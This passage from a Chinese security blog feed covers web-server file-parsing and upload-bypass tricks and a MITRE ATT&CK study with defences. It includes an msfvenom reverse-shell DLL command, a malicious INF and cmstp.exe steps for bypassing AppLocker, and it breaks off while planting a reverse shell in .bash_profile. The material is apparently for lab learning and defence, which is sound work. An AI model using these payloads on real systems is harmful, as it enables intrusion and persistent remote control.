src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/7.png" alt></li><li>指定路径</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/6.png" alt></li><li>勾选了运行脚本（ASP）</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/9.png" alt></li><li>完成</li><li>右击新建的网站——属性——主目录</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/10.png" alt></li><li>配置——选项——勾选父路径</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/11.png" alt></li><li>调试——勾选两个调试标志——确定</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/12.png" alt></li><li>右击新建的网站——权限——是否有everyone（没有则添加——高级——立即查找——everyone）——everyone的权限——完全控制（这是测试环境，真实环境自行判断权限利弊）——确定</li><li>右击新建的网站——浏览</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/13.png" alt></li><li><strong>目录解析测试</strong></li><li>测试文件test.asp：&lt;%= server.mappath(Request.ServerVariables(“PATH_INFO”))%&gt;</li><li>.asp改为.jpg，直接访问test.jpg，不能解析asp代码的</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/14.png" alt></li><li>新建1.asp文件夹，把test.jpg复制到1.asp文件夹中，访问/1.asp/test.jpg</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/15.png" alt></li><li><strong>文件后缀名解析测试</strong></li><li>把不在1.asp文件夹的test.jpg改名为1.asp;test.jpg，访问</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/16.png" alt></li><li><strong>其他可解析的后缀名</strong></li><li>.asa</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/17.png" alt></li><li>.cer</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/18.png" alt></li><li><strong>原因：</strong></li><li>右击网站——属性——主目录——配置</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/19.png" alt></li><li>都是使用C:\WINDOWS\system32\inetsrv\asp.dll来执行的</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/20.png" alt></li><li>同理，自定义可解析的后缀名</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/21.png" alt></li><li>成功解析</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/22.png" alt></li><li>试试其他不存在的</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/23.png" alt></li></ol><h2 id="0x02-IIS-7-0-7-5、Nginx-lt-0-8-37"><a href="#0x02-IIS-7-0-7-5、Nginx-lt-0-8-37" class="headerlink" title="0x02 IIS 7.0/7.5、Nginx &lt;=0.8.37"></a>0x02 IIS 7.0/7.5、Nginx &lt;=0.8.37</h2><ol><li>IIS 7.0 需要.net framework 4.0版本</li><li>IIS 7.5 需要.net framework 4.5版本</li><li><strong>环境</strong></li><li>windows server 2008</li><li><strong>搭建</strong></li><li>开始——管理工具——服务器管理器——角色——添加角色——下一步——勾选web服务器(IIS)</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/27.png" alt></li><li>勾选角色服务（重点是勾选CGI）</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/28.png" alt></li><li>下一步——安装——完成</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/29.png" alt></li><li>服务器管理器——角色——web服务器（IIS）——Internet信息服务（IIS）管理器——WIN-XXXXXXX——网站——Default Web Site——默认启动——浏览</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/30.png" alt></li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/31.png" alt></li><li>右击网站——添加网站——填好信息</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/32.png" alt></li><li>网站目录下新建test.html文件</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/33.png" alt><pre><code>&lt;!DICTORY html&gt;&lt;html&gt;&lt;title&gt;test&lt;/title&gt;&lt;body&gt;&lt;h3&gt;IIS 7.5 TEST&lt;/h3&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/34.png" alt></li><li>配置PHP环境（phpstudy的php环境，如php-5.4.45-nts）</li><li>修改C:\phpStudy\php\php-5.4.45-nts\php.ini里的（phpstudy的默认配置就好）</li><li>extension_dir =”C:\phpStudy\php\php-5.4.45-nts\ext”，单独安装的php，其他相关PHP配置，可自行百度</li><li>配置IIS支持PHP——网站——处理程序映射</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/35.png" alt></li><li>添加模块映射，设置配置——确定——是</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/36.png" alt></li><li>点击起始页下的计算机名——双击FastCgi设置</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/37.png" alt></li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/38.png" alt></li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/39.png" alt></li><li>确定</li><li>网站目录下新建test.php</li><li><?php phpinfo();?></li><li>访问测试</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/40.png" alt></li><li>把.php改为.jpg（或者图片木马），访问，没有解析成php文件</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/41.png" alt></li><li>在访问链接后添加/*.php，再次访问</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/42.png" alt></li><li>删除CGI角色服务</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/43.png" alt></li><li>再次访问</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/44.png" alt></li></ol><p><strong>同样nginx在fast-cgi开启状态时（php的配置文件中的选项cgi.fix_pathinfo = 1），同样/1.jpg/.php可解析成php</strong><br><strong>在fast-cgi关闭的情况下，nginx版本:0.5., 0.6., 0.7- 0.7.65, 0.8 -0.8.37，1.jpg%00.php可被解析</strong><br><strong>nginx版本: 0.8.41至1.4.3和1.5.7之前的1.5.x，上传正常图片，访问时后面+”空格”+”\0”+”.php”，即让图片作为php文件解析，/1.jpg \0.php</strong></p><h2 id="0x03-Apache解析漏洞"><a href="#0x03-Apache解析漏洞" class="headerlink" title="0x03 Apache解析漏洞"></a>0x03 Apache解析漏洞</h2><ol><li>Apache解析后缀名是从右往左依次解析后缀名，不可识别的后缀名则跳过，识别下一个。</li><li>Apache解析后缀名的配置文件：/etc/mime.types（Linux）、X:\PhpStudy2018\PHPTutorial\Apache\conf\mime.types（windows）</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/24.png" alt></li><li>都被注释了，实际上，解析php的配置文件在/etc/apache2/mods-enabled/php7.3.conf（Linux）、httpd.conf（windows）</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/25.png" alt></li><li><strong>注意：</strong></li><li>Apache的解析特点，像test.php.a文件，Apache会认为是php文件，但Apache服务器是不提供脚本解析的功能，脚本解析会交给PHP解析器，PHP解析器认为test.php.a文件不是php文件。</li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/45.png" alt></li><li><strong>修改对.php这样的文件访问的配置</strong><pre><code>&lt;FileMatch &quot;.+\.ph(p[3457]?|t|tml)\.&quot;&gt; Require all granted #允许所有访问请求 Require all denied #拒绝所有访问请求 Require host google.com #仅允许特定域名的主机访问请求，其他都拒绝 Require ip 192.168.1.1 #仅允许特定IP的主机访问请求 Require not ip 192.168.1.2 #拒绝指定IP的访问请求 Require env env-var [env-var] ... #允许匹配环境变量中任意一个 Require method http-method [http-method] ... #允许特定的HTTP方法（GET/POST/HEAD/OPTIONS） Require expr expression #允许，表达式为true Require user userid [ userid ] ... #允许特定用户 Require group group-name [group-name] ... #允许特定用户组 Require valid-user # #允许，有效用户&lt;/FileMatch&gt;</code></pre></li><li><img src="/%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/26.png" alt></li></ol><h2 id="0x04-windows文件名特性"><a href="#0x04-windows文件名特性" class="headerlink" title="0x04 windows文件名特性"></a>0x04 windows文件名特性</h2><ol><li>大小写不敏感</li><li>test.asp</li><li>TEST.ASP</li><li>Test.Asp</li><li>test.asp.</li><li>test.asp[空格]</li><li>test.asp[空格].</li><li>test.asp.[空格]</li><li>test.asp.[空格].</li><li>test.asp:test.jpg.. #: 起到截断作用</li><li>test.asp .. .. ..</li><li>test.asp . . .</li><li>这些都是指向test.asp</li></ol><h2 id="0x05-文件头欺骗漏洞"><a href="#0x05-文件头欺骗漏洞" class="headerlink" title="0x05 文件头欺骗漏洞"></a>0x05 文件头欺骗漏洞</h2><ol><li>文件头添加 GIF87a 或 GIF89a，保存为图片后缀名的文件</li></ol><h2 id="0x06-00截断"><a href="#0x06-00截断" class="headerlink" title="0x06 00截断"></a>0x06 00截断</h2><ol><li>方式一：文件名改为test.php .jpg，burpsuite抓包，hex下把空格对应的20改为00</li><li>方式二：test.php%00.jpg，burpsuite抓包，选中%00右键——Convert Selection——URL——URL decode</li></ol><h2 id="0x07-filetype漏洞"><a href="#0x07-filetype漏洞" class="headerlink" title="0x07 filetype漏洞"></a>0x07 filetype漏洞</h2><ol><li>Content-type头</li><li>content-type:images/jpeg 改为 content-type:text/asp</li><li>或者 Content-Type: text/plain 改为 Content-Type: image/gif 等等</li></ol><h2 id="0xFF-参考"><a href="#0xFF-参考" class="headerlink" title="0xFF 参考"></a>0xFF 参考</h2><ol><li><a href="https://www.baidu.com/" target="_blank" rel="noopener">https://www.baidu.com/</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATTACK学习</title>
      <link href="/ATTACK%E5%AD%A6%E4%B9%A0/"/>
      <url>/ATTACK%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 <strong>前言</strong></h2><p><img src="/ATTACK%E5%AD%A6%E4%B9%A0/11.png" alt="企业ATT＆CK矩阵"><br><a href="https://attack.mitre.org/" target="_blank" rel="noopener">https://attack.mitre.org/</a></p><h4 id="注：英文Google翻译"><a href="#注：英文Google翻译" class="headerlink" title="注：英文Google翻译"></a>注：英文Google翻译</h4><h2 id="0x01-目录"><a href="#0x01-目录" class="headerlink" title="0x01 目录"></a>0x01 <strong>目录</strong></h2><h2 id="Initial-Access（初始访问：尝试进入目标网络）"><a href="#Initial-Access（初始访问：尝试进入目标网络）" class="headerlink" title="Initial Access（初始访问：尝试进入目标网络）"></a>Initial Access（初始访问：尝试进入目标网络）</h2><p><a href="#T1189">T1189-Drive-by Compromise 偷渡式妥协</a><br><a href="#T1190">T1190-Exploit Public-Facing Application 利用面向公众的应用程序</a><br><a href="#T1133">T1133-External Remote Services 外部远程服务</a><br><a href="#T1200">T1200-Hardware Additions 硬件附加</a><br><a href="#T1091">T1091-Replication Through Removable Media 通过可移动媒体复制</a><br><a href="#T1193">T1193-Spearphishing Attachment 鱼叉式附件</a><br><a href="#T1192">T1192-Spearphishing Link 鱼叉式链接</a><br><a href="#T1194">T1194-Spearphishing via Service 通过服务进行鱼叉</a><br><a href="#T1195">T1195-Supply Chain Compromise 供应链妥协</a><br><a href="#T1199">T1199-Trusted Relationship 信任关系</a><br><a href="#T1078">T1078-Valid Accounts 有效账户</a></p><h2 id="Execution（执行：执行恶意代码）"><a href="#Execution（执行：执行恶意代码）" class="headerlink" title="Execution（执行：执行恶意代码）"></a>Execution（执行：执行恶意代码）</h2><p><a href="#T1155">T1155-AppleScript 苹果脚本</a>（）<br><a href="#T1191">T1191-CMSTP Microfost连接管理器配置文件安装程序</a><br><a href="#T1059">T1059-Command-Line Interface 命令行界面</a></p><p><a href="#T1004">T1004-windows winlogon</a><br><a href="#T1015">T1015-Windows Accessibility Features（辅助功能）</a><br><a href="#T1038">T1038-DLL搜索顺序劫持</a><br><a href="#T1042">T1042-Change Default File Association(更改默认文件关联)</a><br><a href="#T1044">T1044-File System Permissions Weakness</a></p><p>Discovery<br><a href="#T1087">T1087-Account Discovery 账户发现</a><br><a href="#T1088">T1088-Bypass User Account Control（绕过用户账户控制）</a><br><a href="#T1098">T1098-windows Admin Account Manipulate（管理员账户操作）</a><br><a href="#T1100">T1100-windows/Linux web shell</a><br><a href="#T1136">T1136-Creat Account（创建账号）</a><br><a href="#T1138">T1138-windows Application Shimming Attack（直译：应用程序匀速攻击）</a><br><a href="#T1156">T1156-Linux .bash_profile and .bashrc</a><br><a href="#T1176">T1176-Browser Extensions（浏览器扩展）</a><br><a href="#T1197">T1197-windows BITS Jobs (Windows后台智能传输服务)</a></p><p><span id="T"></span></p><h2 id="0x10-Initial-Access（初始访问：尝试进入目标网络）"><a href="#0x10-Initial-Access（初始访问：尝试进入目标网络）" class="headerlink" title="0x10 Initial Access（初始访问：尝试进入目标网络）"></a>0x10 <strong>Initial Access（初始访问：尝试进入目标网络）</strong></h2><h2 id="0x11-T1189-Drive-by-Compromise"><a href="#0x11-T1189-Drive-by-Compromise" class="headerlink" title="0x11 T1189-Drive-by Compromise"></a>0x11 <span id="T1189">T1189-Drive-by Compromise</span></h2><ul><li>描述：攻击者利用用户信任的网站的漏洞来上传利用程序、注入恶意代码或插入恶意脚本，通过用户访问信任网站来触发恶意程序或代码执行，最终获取对用户系统的访问权限。</li><li>常见攻击：水坑攻击</li></ul><p><strong>例子</strong></p><ol><li>黑客锁定目标用户经常访问和信任的站点。例如锁定银行金融用户信任和常访问的金融机构网站。</li><li>在圈定的站点范围内，找寻最容易被远程利用的 Web 漏洞，从而上传攻击代码隐蔽在站点。</li><li>目标用户访问被黑客布设好机关的可信站点时，恶意代码被执行。</li><li>目标用户在全然不知情的情况下，被引向到黑客架设的恶意站点，从而完成木马和病毒程序在用户电脑上的安装。</li><li>黑客通过安装在目标用户电脑上的木马程序远程操控用户电脑，攻击告成。</li><li><a href="https://attack.mitre.org/techniques/T1189/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1189/</a></li></ol><p><strong>防御</strong></p><ol><li>使用沙箱对应用程序隔离</li><li>部署安全硬软件</li><li>对用户、文件或目录设置具体的是否可读、可写、可执行权限</li><li>及时更新应用程序版本、系统补丁和病毒库</li></ol><h2 id="0x12-T1190-Exploit-Public-Facing-Application"><a href="#0x12-T1190-Exploit-Public-Facing-Application" class="headerlink" title="0x12 T1190-Exploit Public-Facing Application"></a>0x12 <span id="T1190">T1190-Exploit Public-Facing Application</span></h2><ul><li>描述：攻击者利用暴露在外网的应用漏洞来攻陷服务器，甚至完全控制服务器。</li><li>常见攻击：服务器上安装的应用服务存在0day或Nday，OWASP TOP 10，系统漏洞等等</li></ul><p><strong>例子</strong></p><ol><li>weblogic RCE</li><li>struts2 RCE</li><li>sql injection</li><li>Command execution</li><li>etc.</li></ol><p><strong>防御</strong></p><ol><li>网络隔离，对外服务器限制在指定区域（<a href="https://baike.baidu.com/item/DMZ/631225?fr=aladdin" target="_blank" rel="noopener">DMZ</a>或单独的托管基础结构上）</li><li>使用沙箱对应用程序隔离</li><li>部署安全硬软件</li><li>应用程序的用户权限最小化</li><li>定期扫描系统服务及目录文件</li><li>及时更新应用程序版本、系统补丁和病毒库</li></ol><h2 id="0x13-T1133-External-Remote-Services"><a href="#0x13-T1133-External-Remote-Services" class="headerlink" title="0x13 T1133-External Remote Services"></a>0x13 <span id="T1133">T1133-External Remote Services</span></h2><ul><li>描述：VPN/Teamview等远程服务，用户可以从外网连接到内网进行内网访问，可能造成用户信息泄露，数据丢失，数据被增删改查，甚至服务器被控制等等。</li><li>常用攻击：通过漏洞，凭据篡改，欺骗、窃取、未失效的连接等等，获取到有效账户</li></ul><p><strong>例子</strong></p><ol><li>VPN账户密码过于简单、可猜测、可爆破、登录窗口记住密码、甚至无密码等等</li><li>逻辑漏洞：平行越权、垂直越权等</li><li>VPN凭据明文保存在本地，加密处理过于简单</li><li>etc.</li></ol><p><strong>防御</strong></p><ol><li>删除或禁用非必要服务或程序</li><li>限制通过网络访问资源的范围</li><li>多因素认证：密码认证、手机号认证、动态图像认证、邮箱认证等等</li><li>网络限制：指定允许访问的IP范围，主机MAC地址范围等等</li></ol><h2 id="0x14-T1200-Hardware-Additions"><a href="#0x14-T1200-Hardware-Additions" class="headerlink" title="0x14 T1200-Hardware Additions"></a>0x14 <span id="T1200">T1200-Hardware Additions</span></h2><ul><li>描述：攻击者可能将计算机附件、计算机或网络硬件引入系统或网络中，这些系统或网络可用作获取访问目标网络或系统的代理、跳板。</li><li>常用攻击：无源网络窃听、中间人窃听破解、按键注入、通过DMA读取内核内存、新添无线访问、USB攻击等等</li></ul><p><strong>防御</strong></p><ol><li>网络限制，建立访问控制策略（ACL），使用指定证书和<a href="https://baike.baidu.com/item/802.1x/5635474?fr=aladdin" target="_blank" rel="noopener">802.1x协议</a>，防止未注册或不信任设备接入或访问网络。</li><li>硬件限制，通过终端安全配置和监视代理，阻止未知的硬件设备或附件接入</li></ol><h2 id="0X15-T1091-Replication-Through-Removable-Media"><a href="#0X15-T1091-Replication-Through-Removable-Media" class="headerlink" title="0X15 T1091-Replication Through Removable Media"></a>0X15 <span id="T1091">T1091-Replication Through Removable Media</span></h2><ul><li>描述：攻击者可能使用可移动媒体接入到系统中并自动运行恶意文件或程序。</li><li>常用攻击：badusb、恶意充电宝、etc.<br><img src="/ATTACK%E5%AD%A6%E4%B9%A0/49.png" alt></li></ul><p><strong>例子</strong></p><ol><li><a href="https://attack.mitre.org/techniques/T1091/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1091/</a></li></ol><p><strong>防御</strong></p><ol><li>禁止非必要应用程序或服务自动启动运行，如果不需要可移动设备接入，可停止对应的驱动</li><li>限制在网络中使用USB设备</li></ol><h2 id="0x16-T1193-Spearphishing-Attachment"><a href="#0x16-T1193-Spearphishing-Attachment" class="headerlink" title="0x16 T1193-Spearphishing Attachment"></a>0x16 <span id="T1193">T1193-Spearphishing Attachment</span></h2><ul><li>描述：攻击者将文件附加到欺骗性电子邮件中，依靠用户执行来执行，例如Microsoft office文档、可执行文件、PDF或存档文件，打开附件后，文件中的有效负载就会利用漏洞或直接执行命令。</li><li>常用攻击：发送附带恶意附件（.rtf/.doc/.xls/.exe/.scr/.iqy/.chm/etc.）的电子邮件。</li><li><a href="https://attack.mitre.org/techniques/T1193/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1193/</a></li></ul><p><strong>防御</strong></p><ol><li>安装安全软件，开启自动扫描隔离可疑文件</li><li>基于web防护，阻止未知或可疑的附件，防止一触即发。</li><li>对相关人员进行安全意识培训与识别可疑邮件。</li></ol><h2 id="0x17-T1192-Spearphishing-Link"><a href="#0x17-T1192-Spearphishing-Link" class="headerlink" title="0x17 T1192-Spearphishing Link"></a>0x17 <span id="T1192">T1192-Spearphishing Link</span></h2><ul><li>描述：攻击者发送电子邮件中附带恶意链接，用户访问恶意链接可能会利用浏览器来下载应用程序、文档、zip文件或者其他可执行文件，诱导用户下载并点开执行，从而达到攻击者的攻击目的。链接还可以获取用户应用程序的访问令牌等等</li><li>常用攻击：发送带有恶意链接的邮件</li></ul><p><strong>防御</strong></p><ol><li>基于web防护，监控浏览器流量，阻止浏览器随意下载或打开执行各种不明文件。</li><li>对相关人员进行安全意识培训，自主识别信任网站与钓鱼网站。</li><li>安装安全软件，开启自动扫描隔离可疑文件</li></ol><h2 id="0x18-T1194-Spearphishing-via-Service"><a href="#0x18-T1194-Spearphishing-via-Service" class="headerlink" title="0x18 T1194-Spearphishing via Service"></a>0x18 <span id="T1194">T1194-Spearphishing via Service</span></h2><ul><li>描述：通过服务进行钓鱼。攻击者扮演朋友、同事、上下级、客户等身份向被攻击者发送个人媒体信息、个人web邮件、非企业信息、上下级邮件往来等等，这些信息往往取得被攻击者的信任而打开文件、运行程序或者执行文件。</li><li>常用攻击：攻击者扮演被攻击者可信任的对象，向对方发送附带恶意文件、程序或链接的信息，诱导对方打开。</li></ul><p><strong>防御</strong></p><ol><li>安装安全软件，开启自动扫描隔离可疑文件</li><li>基于web防护，监控浏览器流量，阻止浏览器随意下载或打开执行各种不明文件。</li><li>对相关人员进行安全意识培训</li></ol><h2 id="0x19-T1195-Supply-Chain-Compromise"><a href="#0x19-T1195-Supply-Chain-Compromise" class="headerlink" title="0x19 T1195-Supply Chain Compromise"></a>0x19 <span id="T1195">T1195-Supply Chain Compromise</span></h2><ol><li>描述：在产品最终交付之前，在产品上添加恶意代码，最终获取或破坏用户数据或系统。</li><li>常用攻击：</li><li><ul><li>操纵开发工具</li></ul></li><li><ul><li>操纵开发环境</li></ul></li><li><ul><li>操作源代码存储库</li></ul></li><li><ul><li>在开发源代码项中处理源代码</li></ul></li><li><ul><li>操作产品更新/分发机制</li></ul></li><li><ul><li>易损/感染的系统映像</li></ul></li><li><ul><li>修改后的版本替换合法版本</li></ul></li><li><ul><li>向合法用户销售或分发修改过/伪造的产品</li></ul></li><li><ul><li>装运阻截</li></ul></li></ol><p><strong>例子</strong></p><ol><li>生产中，将恶意代码注入到经过合法签名的文件中，最终分发给用户。</li></ol><p><strong>防御</strong></p><ol><li>自主识别web官网，关注官网更新消息，只在官网指定位置下载并更新应用程序</li><li>定期对系统及应用程序进行漏洞扫描与持续监控。</li></ol><h2 id="0x1A-T1199-Trusted-Relationship"><a href="#0x1A-T1199-Trusted-Relationship" class="headerlink" title="0x1A T1199-Trusted Relationship"></a>0x1A <span id="T1199">T1199-Trusted Relationship</span></h2><ul><li>描述：攻击者可能通过可信任的第三方关系对受害者进行访问并利用相关资源，此操作往往不被安全机制严格审查或只受较少的审查。例如：第三方（IT运维、服务托管商、安全提供商、基础架构承包商）被授权访问内部机房环境。</li><li>常用攻击：被授权的攻击者访问其他用户的信息，同网络内系统或服务被信息搜集及漏洞利用。</li></ul><p><strong>防御</strong></p><ol><li>网络隔离，禁止主动搜集其他系统或服务。</li><li>权限控制，限制用户只能访问自己的资源而不能越权访问他人未公开的资源。</li></ol><h2 id="0x1B-T1078-Valid-Accounts"><a href="#0x1B-T1078-Valid-Accounts" class="headerlink" title="0x1B T1078-Valid Accounts"></a>0x1B <span id="T1078">T1078-Valid Accounts</span></h2><ul><li>描述：攻击者可能利用凭据访问技术窃取特定用户或服务账户的凭据，来登录相关系统服务。</li><li>常用攻击：钓鱼、中间人欺骗、爆破、弱密码、万能密码、社工等等</li><li><a href="https://attack.mitre.org/techniques/T1078/" target="_blank" rel="noopener">https://attack.mitre.org/techniques/T1078/</a></li></ul><p><strong>防御</strong></p><ol><li>开发安全要求：确保应用程序不会不安全地存储敏感数据或登录凭据（口令、密码）</li><li>审计：定期审核源代码，应用程序配置文件，开发存储库和公共云存储，以确保凭证的使用和存储安全。</li><li>过滤流量：使用白名单限制基于IP的用户访问资源，确保IP与用户相关联，减少凭据被窃取的数据访问。</li><li>多因素认证：集成多因素身份认证，降低用户身份被控制的风险。</li><li>密码策略：安装后或部署到生产环境之前，立即更改默认账户与密码及其相关信息（应用程序、设备），确保密码具备无序且复杂度及位数要求，定期更新等</li><li>特权用户管理：审核域和本地账户及其权限级别，查找可能通过获取特权账户的凭据而获得特权账户的权限。对整个系统的敏感目录及文件设置细致的是否可读可写可执行权限。</li><li>用户账户管理：分配适当的用户权限，用户访问范围，阻止用户访问除需要访问的应用程序、目录和服务以外的系统。</li></ol><h2 id="0x20-Execution（执行：执行恶意代码）"><a href="#0x20-Execution（执行：执行恶意代码）" class="headerlink" title="0x20 Execution（执行：执行恶意代码）"></a>0x20 <strong>Execution（执行：执行恶意代码）</strong></h2><h2 id="0x21-T1191-CMSTP"><a href="#0x21-T1191-CMSTP" class="headerlink" title="0x21 T1191-CMSTP"></a>0x21 <span id="T1191">T1191-CMSTP</span></h2><ul><li>描述：CMSTP.exe接受安装信息文件（INF）作为参数，并安装用于远程访问连接的服务配置文件。</li><li>常用攻击：攻击者可能会向CMSTP.exe提供感染了恶意命令的inf文件。CMSTP.exe可能被利用来从远程服务器加载执行DLL或COM脚本（SCT）。因为CMSTP.exe是合法的，可能会绕过Applocker和其他白名单防御。同理，可绕过用户账户控制。</li><li>cmstp.exe的位置：C:\Windows\System32\cmstp.exe、C:\Windows\SysWOW64\cmstp.exe</li></ul><p><strong>攻击例子</strong><br>2. <strong>applocker演示效果</strong><br>3. 运行<strong>secpol.msc</strong> #打开本地安全策略<br>3. 安全设置——应用程序控制策略——AppLocker——可执行规则（或者 脚本规则等）——右击创建新规则——下一步——拒绝——默认everyone——下一步——路径（这里测试选路径）——下一步——选择浏览文件——选择应用程序启动文件（这里测试选Firefox.exe）——创建<br>4. <img src="/ATTACK%E5%AD%A6%E4%B9%A0/50.png" alt><br>5. 运行<strong>services.msc</strong> #打开服务<br>6. 右击服务Application Identity——属性——设置自动启动——启动——应用——确定<br>7. 再启动Firefox，被禁止了<br>8. <img src="/ATTACK%E5%AD%A6%E4%B9%A0/51.png" alt></p><p><strong>同理，禁止了DLL脚本与绕过</strong></p><ol><li><strong>生成利用DLL</strong></li><li>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.100.4 lport=4444 -i 6 -e x86/shikata_ga_nai &gt;shell.dll</li></ol><p><strong>shell.inf</strong></p><pre><code>[version]Signature=$chicago$AdvancedINF=2.5[DefaultInstall_SingleUser]RegisterOCXs=RegisterOCXSection[RegisterOCXSection]C:\Users\%username%\Desktop\shell.dll[Strings]AppAct = &quot;SOFTWARE\Microsoft\Connection Manager&quot;ServiceName=&quot;shell&quot;ShortSvcName=&quot;shell&quot;</code></pre><ol><li><strong>启动msf监听端口：</strong></li><li>use exploit/multi/handler</li><li>set payload windows/x64/meterpreter/reverse_tcp</li><li>set lhost 192.168.100.4</li><li>set lport 4444 #默认的</li><li>exploit</li><li><strong>cmd执行：</strong></li><li>cmstp.exe /s shell.inf</li><li><img src="/ATTACK%E5%AD%A6%E4%B9%A0/52.png" alt></li></ol><p><strong>防御</strong></p><ol><li>禁用或删除无需的功能或程序，一般情况下，CMSTP.exe就不是必需的。</li><li>禁止执行程序，可以设置白名单来禁止类似cmstp.exe的应用程序执行。</li></ol><h2 id="0x22-T1059-Command-Line-Interface"><a href="#0x22-T1059-Command-Line-Interface" class="headerlink" title="0x22 T1059-Command-Line Interface"></a>0x22 <span id="T1059">T1059-Command-Line Interface</span></h2><ul><li>描述：命令行界面提供可以与计算机系统进行交互的功能，类似cmd。</li><li>常用攻击：各种脚本调用命令执行函数、远程桌面进入系统或反弹shell会话等等本地或远程使用命令行界面执行系统命令。</li></ul><h2 id="0x30-Linux"><a href="#0x30-Linux" class="headerlink" title="0x30 Linux"></a>0x30 Linux</h2><h2 id="0x31-T1156-Linux-bash-profile-and-bashrc"><a href="#0x31-T1156-Linux-bash-profile-and-bashrc" class="headerlink" title="0x31 T1156-Linux .bash_profile and .bashrc"></a>0x31 <span id="T1156">T1156-Linux .bash_profile and .bashrc</span></h2><ol><li>~/.bash_profile 和 ~/.bashrc是包含shell命令的shell脚本。当打开新shell或者用户登录时，这些文件都会被执行。</li><li>~/.bash_profile用于登录shell，~/.bashrc用于交互式非登录shell。</li><li>当用户使用账号密码本地登录或远程登录（SSH）时，~/.bash_profile将在返回初始命令提示符之前被执行。之后，打开新的shell，都会执行~/.bashrc脚本。</li><li>危害：攻击者可能通过这些脚本插入可执行文件或命令来获取持久性的后门。</li><li><a href="https://blog.csdn.net/duzilonglove/article/details/79729840" target="_blank" rel="noopener">~/.bash_profile 和 ~/.bashrc之间的详细说明与区别</a></li></ol><p><strong>本地测试~/.bash_profile</strong></p><ol><li>本机：192.168.100.1</li><li>虚拟机：192.168.100.15，Centos 7</li><li>虚拟机添加反弹shell命令到~/.bash_profile</li><li><img 